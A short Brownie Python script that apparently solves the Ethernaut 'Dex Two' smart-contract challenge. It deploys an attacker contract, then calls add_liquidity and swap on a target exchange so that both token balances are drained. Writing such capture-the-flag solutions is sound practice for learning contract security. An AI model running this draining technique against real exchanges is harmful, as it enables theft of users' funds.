from brownie import accounts, config, interface, DexAttack

def main(target):
    dex = interface.IDexTwo(target)
    token1 = interface.IERC20(dex.token1())
    token2 = interface.IERC20(dex.token2())
    hacker = accounts.add(config['wallets']['from_key'])
    attack = DexAttack.deploy({'from': hacker})
    dex.add_liquidity(attack, 100, {'from': hacker})
    dex.swap(attack, token1, 100, {'from': hacker})
    dex.add_liquidity(attack, 100, {'from': hacker})
    dex.swap(attack, token2, 100, {'from': hacker})